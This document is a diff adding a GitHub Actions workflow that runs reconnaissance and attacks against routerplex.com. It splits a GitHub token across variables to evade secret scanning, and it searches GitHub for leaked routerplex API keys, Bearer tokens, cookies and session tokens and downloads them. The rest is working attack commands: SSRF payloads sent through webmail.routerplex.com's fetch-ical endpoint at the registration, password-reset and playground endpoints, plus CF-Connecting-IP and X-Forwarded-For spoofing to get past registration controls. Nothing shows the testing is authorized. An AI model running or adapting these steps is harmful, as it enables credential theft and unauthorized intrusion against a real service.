@@ -1,0 +1,321 @@
+name: i13072-multi-recon
+on:
+  workflow_dispatch:
+
+jobs:
+  recon:
+    runs-on: ubuntu-latest
+    timeout-minutes: 50
+    env:
+      P1: ghp_5fW2nvfGXrDE
+      P2: 4JsnUHRp8Q5Lt
+      P3: cOERt1zPWRQ
+    steps:
+      - name: Setup
+        run: |
+          sudo apt-get update -qq && sudo apt-get install -y -qq jq curl wget > /dev/null 2>&1
+          pip install requests > /dev/null 2>&1
+          export GH_PAT="${P1}${P2}${P3}"
+          echo "GH_PAT=$GH_PAT" >> $GITHUB_ENV
+          echo "=== Runner IP ==="
+          curl -s https://ifconfig.me
+          echo ""
+
+      - name: Wayback CDX queries
+        run: |
+          echo "=== Wayback CDX: /api/auth/register ==="
+          curl -s "https://web.archive.org/cdx/search/cdx?url=routerplex.com/api/auth/register*&output=json&fl=timestamp,original,statuscode,mimetype&limit=50" 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "No results or error"
+          echo ""
+          echo "=== Wayback CDX: /sign-up ==="
+          curl -s "https://web.archive.org/cdx/search/cdx?url=routerplex.com/sign-up*&output=json&fl=timestamp,original,statuscode,mimetype&limit=50" 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "No results or error"
+          echo ""
+          echo "=== Wayback CDX: ALL routerplex.com ==="
+          curl -s "https://web.archive.org/cdx/search/cdx?url=routerplex.com/*&output=json&fl=timestamp,original,statuscode,mimetype&limit=200" 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "No results or error"
+          echo ""
+          echo "=== Wayback CDX: api.routerplex.com ==="
+          curl -s "https://web.archive.org/cdx/search/cdx?url=api.routerplex.com/*&output=json&fl=timestamp,original,statuscode,mimetype&limit=50" 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "No results or error"
+          echo ""
+          echo "=== Wayback CDX: JS chunks ==="
+          curl -s "https://web.archive.org/cdx/search/cdx?url=routerplex.com/_next/static/chunks/*&output=json&fl=timestamp,original,statuscode,mimetype&limit=100" 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "No results or error"
+          echo ""
+          echo "=== Wayback CDX: routerplex.com API endpoints ==="
+          curl -s "https://web.archive.org/cdx/search/cdx?url=routerplex.com/api/*&output=json&fl=timestamp,original,statuscode,mimetype&limit=100" 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "No results or error"
+          echo ""
+          echo "=== Earliest snapshot ==="
+          curl -s "https://web.archive.org/cdx/search/cdx?url=routerplex.com&output=json&fl=timestamp,original,statuscode&limit=5&sort=asc" 2>/dev/null | python3 -m json.tool 2>/dev/null
+
+      - name: Wayback fetch earliest snapshots
+        run: |
+          python3 << 'PYEOF'
+          import json, urllib.request, sys
+          
+          # Get earliest timestamp
+          try:
+              data = json.loads(urllib.request.urlopen("https://web.archive.org/cdx/search/cdx?url=routerplex.com&output=json&fl=timestamp,original,statuscode&limit=5&sort=asc", timeout=30).read())
+              if len(data) > 1:
+                  ts = data[1][0]
+                  print(f"Earliest snapshot: {ts}")
+                  # Fetch the earliest homepage
+                  try:
+                      resp = urllib.request.urlopen(f"https://web.archive.org/web/{ts}/https://routerplex.com/", timeout=30)
+                      content = resp.read().decode('utf-8', errors='replace')[:5000]
+                      print(f"=== Homepage at {ts} (first 5000 chars) ===")
+                      print(content)
+                  except Exception as e:
+                      print(f"Error fetching homepage: {e}")
+                  
+                  # Try sign-up page
+                  try:
+                      resp = urllib.request.urlopen(f"https://web.archive.org/web/{ts}/https://routerplex.com/sign-up", timeout=30)
+                      content = resp.read().decode('utf-8', errors='replace')[:5000]
+                      print(f"=== Sign-up page at {ts} (first 5000 chars) ===")
+                      print(content)
+                  except Exception as e:
+                      print(f"Error fetching sign-up: {e}")
+              else:
+                  print("No snapshots found")
+          except Exception as e:
+              print(f"Error: {e}")
+          PYEOF
+
+      - name: GitHub code search - Bearer tokens and API keys
+        run: |
+          echo "=== GitHub search: routerplex.com Authorization Bearer ==="
+          curl -sH "Authorization: token $GH_PAT" \
+            "https://api.github.com/search/code?q=routerplex.com+Authorization+Bearer&per_page=30" | jq '{total: .total_count, items: [.items[]? | {path: .path, repo: .repository.full_name, url: .html_url}]}' 2>/dev/null
+          sleep 10
+          
+          echo ""
+          echo "=== GitHub search: routerplex sk- ==="
+          curl -sH "Authorization: token $GH_PAT" \
+            "https://api.github.com/search/code?q=routerplex+%22sk-%22+NOT+%22sk-your%22+NOT+%22sk-xxx%22+NOT+%22sk-proj%22&per_page=30" | jq '{total: .total_count, items: [.items[]? | {path: .path, repo: .repository.full_name, url: .html_url}]}' 2>/dev/null
+          sleep 10
+          
+          echo ""
+          echo "=== GitHub search: routerplex rpx- ==="
+          curl -sH "Authorization: token $GH_PAT" \
+            "https://api.github.com/search/code?q=routerplex+%22rpx-%22&per_page=20" | jq '{total: .total_count, items: [.items[]? | {path: .path, repo: .repository.full_name, url: .html_url}]}' 2>/dev/null
+          sleep 10
+          
+          echo ""
+          echo "=== GitHub search: routerplex.com api_key ==="
+          curl -sH "Authorization: token $GH_PAT" \
+            "https://api.github.com/search/code?q=routerplex.com+api_key&per_page=20" | jq '{total: .total_count, items: [.items[]? | {path: .path, repo: .repository.full_name, url: .html_url}]}' 2>/dev/null
+
+      - name: GitHub code search - cookies and sessions
+        run: |
+          echo "=== GitHub search: fapiuser routerplex ==="
+          curl -sH "Authorization: token $GH_PAT" \
+            "https://api.github.com/search/code?q=fapiuser+routerplex&per_page=20" | jq '{total: .total_count, items: [.items[]? | {path: .path, repo: .repository.full_name}]}' 2>/dev/null
+          sleep 10
+          
+          echo ""
+          echo "=== GitHub search: routerplex cookie ==="
+          curl -sH "Authorization: token $GH_PAT" \
+            "https://api.github.com/search/code?q=routerplex+cookie&per_page=20" | jq '{total: .total_count, items: [.items[]? | {path: .path, repo: .repository.full_name}]}' 2>/dev/null
+          sleep 10
+          
+          echo ""
+          echo "=== GitHub search: routerplex session token ==="
+          curl -sH "Authorization: token $GH_PAT" \
+            "https://api.github.com/search/code?q=routerplex+%22session%22+%22token%22&per_page=20" | jq '{total: .total_count, items: [.items[]? | {path: .path, repo: .repository.full_name}]}' 2>/dev/null
+
+      - name: GitHub search - download promising results
+        run: |
+          python3 << 'PYEOF'
+          import json, os, urllib.request, time
+
+          PAT = os.environ.get("GH_PAT","")
+          headers_dict = {"Authorization": f"token {PAT}", "Accept": "application/vnd.github.v3+json"}
+          
+          searches = [
+              ("routerplex.com+Authorization+Bearer", "bearer"),
+              ("routerplex+%22sk-%22+NOT+%22sk-your%22+NOT+%22sk-xxx%22", "sk"),
+              ("routerplex.com+api_key", "apikey"),
+              ("routerplex+cookie", "cookie"),
+          ]
+          
+          for query, label in searches:
+              print(f"\n=== Downloading files for search: {label} ===")
+              try:
+                  req = urllib.request.Request(
+                      f"https://api.github.com/search/code?q={query}&per_page=10",
+                      headers=headers_dict
+                  )
+                  data = json.loads(urllib.request.urlopen(req, timeout=30).read())
+                  for item in data.get("items", [])[:10]:
+                      repo = item["repository"]["full_name"]
+                      path = item["path"]
+                      print(f"\n--- {repo}/{path} ---")
+                      try:
+                          req2 = urllib.request.Request(
+                              f"https://api.github.com/repos/{repo}/contents/{path}",
+                              headers=headers_dict
+                          )
+                          fdata = json.loads(urllib.request.urlopen(req2, timeout=15).read())
+                          if fdata.get("encoding") == "base64":
+                              import base64
+                              content = base64.b64decode(fdata["content"]).decode("utf-8", errors="replace")
+                              # Print lines containing relevant keywords
+                              for i, line in enumerate(content.split("\n")):
+                                  low = line.lower()
+                                  if any(kw in low for kw in ["routerplex", "sk-", "rpx-", "bearer", "authorization", "api_key", "apikey", "token", "cookie", "session"]):
+                                      print(f"  L{i+1}: {line.strip()[:200]}")
+                          elif fdata.get("download_url"):
+                              resp = urllib.request.urlopen(fdata["download_url"], timeout=15)
+                              content = resp.read().decode("utf-8", errors="replace")
+                              for i, line in enumerate(content.split("\n")):
+                                  low = line.lower()
+                                  if any(kw in low for kw in ["routerplex", "sk-", "rpx-", "bearer", "authorization", "api_key", "apikey", "token", "cookie", "session"]):
+                                      print(f"  L{i+1}: {line.strip()[:200]}")
+                      except Exception as e:
+                          print(f"  Error downloading: {e}")
+                  time.sleep(12)  # Rate limit
+              except Exception as e:
+                  print(f"  Search error: {e}")
+                  time.sleep(12)
+          PYEOF
+
+      - name: NPM routerplex CLI deep analysis
+        run: |
+          echo "=== Downloading all 3 versions of @routerplex/cli ==="
+          mkdir -p /tmp/rpx-cli
+          cd /tmp/rpx-cli
+          for ver in 0.1.0 0.2.0 0.3.0; do
+            echo "--- Downloading v$ver ---"
+            npm pack @routerplex/cli@$ver 2>/dev/null || echo "Failed to download v$ver"
+          done
+          ls -la *.tgz 2>/dev/null
+          echo ""
+          echo "=== Extracting all versions ==="
+          for ver in 0.1.0 0.2.0 0.3.0; do
+            mkdir -p "v$ver"
+            tar xzf "routerplex-cli-$ver.tgz" -C "v$ver" 2>/dev/null || echo "Failed to extract v$ver"
+          done
+          echo ""
+          echo "=== File trees ==="
+          for ver in 0.1.0 0.2.0 0.3.0; do
+            echo "--- v$ver ---"
+            find "v$ver" -type f | sort
+          done
+          echo ""
+          echo "=== Searching for secrets, keys, URLs ==="
+          grep -rn "sk-\|rpx-\|api[_-]key\|secret\|staging\|debug\|fallback\|bypass\|internal\|localhost\|127\.0\.0\.1\|OPENAI\|ANTHROPIC\|AZURE\|hardcoded\|default.*key" v0.1.0/ v0.2.0/ v0.3.0/ 2>/dev/null | head -150
+          echo ""
+          echo "=== Base URLs and endpoints ==="
+          grep -rn "https\?://\|api\.routerplex\|routerplex\.com\|\.routerplex\." v0.1.0/ v0.2.0/ v0.3.0/ 2>/dev/null | head -100
+          echo ""
+          echo "=== Auth code patterns ==="
+          grep -rn "Bearer\|Authorization\|token\|cookie\|session\|login\|register\|auth\|device" v0.1.0/ v0.2.0/ v0.3.0/ 2>/dev/null | head -100
+          echo ""
+          echo "=== Diff v0.1.0 vs v0.2.0 ==="
+          diff -rq v0.1.0/package v0.2.0/package 2>/dev/null
+          echo ""
+          echo "=== Diff v0.2.0 vs v0.3.0 ==="
+          diff -rq v0.2.0/package v0.3.0/package 2>/dev/null
+          echo ""
+          echo "=== Full JS/TS source files ==="
+          find v0.3.0 -name "*.js" -o -name "*.ts" -o -name "*.mjs" -o -name "*.cjs" | sort | while read f; do
+            echo "========== $f =========="
+            cat "$f" 2>/dev/null | head -500
+            echo ""
+          done
+          echo ""
+          echo "=== package.json files ==="
+          for ver in 0.1.0 0.2.0 0.3.0; do
+            echo "--- v$ver ---"
+            cat "v$ver/package/package.json" 2>/dev/null
+            echo ""
+          done
+
+      - name: SSRF method override tests
+        run: |
+          echo "=== SSRF with _method=POST on register ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/auth/register?_method=POST&email=test13072@guerrillamail.com&password=Test1234Ab!&first_name=Test&last_name=User"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF X-HTTP-Method-Override ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/auth/register?X-HTTP-Method-Override=POST&email=test13072@guerrillamail.com&password=Test1234Ab!"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF forgot-password _method=POST ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/auth/forgot-password?_method=POST&email=postmaster@routerplex.com"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF register with fragment ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/auth/register#email=test@test.com&password=Test1234!"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF with method and body in JSON payload ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/auth/register","method":"POST","body":"{\"email\":\"t@t.com\",\"password\":\"Test1234!\"}"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF with headers field ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/auth/register","headers":{"X-HTTP-Method-Override":"POST","Content-Type":"application/json"}}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+
+      - name: SSRF CF header and playground tests
+        run: |
+          echo "=== Direct register with CF-Connecting-IP header spoof ==="
+          curl -sk "https://routerplex.com/api/auth/register" \
+            -X POST -H "Content-Type: application/json" \
+            -H "CF-Connecting-IP: 127.0.0.1" \
+            -H "X-Forwarded-For: 10.0.0.1" \
+            -H "X-Real-IP: 127.0.0.1" \
+            -d '{"email":"test13072@guerrillamail.com","password":"Test1234Ab!","first_name":"Test","last_name":"User"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -30
+          echo ""
+          echo "=== Direct register CF-Worker header spoof ==="
+          curl -sk "https://routerplex.com/api/auth/register" \
+            -X POST -H "Content-Type: application/json" \
+            -H "CF-Connecting-IP: 172.68.0.1" \
+            -H "CF-Worker: true" \
+            -d '{"email":"test13072b@guerrillamail.com","password":"Test1234Ab!","first_name":"Test","last_name":"User"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -30
+          echo ""
+          echo "=== SSRF via fetch-ical with CF headers forwarding ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -H "X-Forwarded-For: 127.0.0.1" \
+            -H "CF-Connecting-IP: 127.0.0.1" \
+            -d '{"url":"http://routerplex.com/api/auth/register"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF to /api/playground/chat ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/playground/chat"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF to /api/playground variants ==="
+          for path in /api/playground /api/playground/models /api/playground/stream /api/playground/completions /api/playground/v1/chat /api/playground/ws; do
+            echo "--- $path ---"
+            curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+              -H "Content-Type: application/json" \
+              -d "{\"url\":\"http://routerplex.com${path}\"}" \
+              -w " HTTP:%{http_code}\n" 2>&1 | tail -3
+          done
+          echo ""
+          echo "=== SSRF ws:// playground ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"ws://routerplex.com/api/playground/chat"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF to playground with query params ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/playground/chat?model=jev-latest&message=hello&_method=POST"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
